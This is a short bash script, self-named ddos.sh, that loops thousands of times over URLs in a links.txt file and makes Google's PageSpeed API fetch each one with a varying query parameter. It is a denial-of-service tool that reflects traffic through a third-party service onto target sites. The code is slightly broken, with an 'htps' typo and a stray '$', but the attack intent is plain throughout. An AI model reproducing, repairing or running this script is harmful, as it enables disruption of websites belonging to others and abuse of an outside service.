#!/bin/bash
control_c(){
        tput clear
        rm -f /tmp/tempfile
	echo "Exiting..."
	exit 1
}
trap control_c SIGINT
if [ "$1" ]; then
	if [ -f /sys/class/net/$1/statistics/tx_bytes ]; then
		KBS=$((`cat /sys/class/net/$1/statistics/tx_bytes`/1024 /2))
		echo "$1: $KBS kb/s"
	else
		echo "This interface is not valid"; exit 1;
	fi
	for ((i=5000; i<=8000; i++)); do
        	cat links.txt | while read line; do
	                curl "htps://www.googleapis.com/pagespeedonline/v2/runPagespeed?url=$line?sz=$i" --limit-rate "$KBS"K -s -O /dev/null $
        		echo $i;
		done
	done
else
	echo "Usage: ./ddos.sh eth0 <network-interface>"
fi
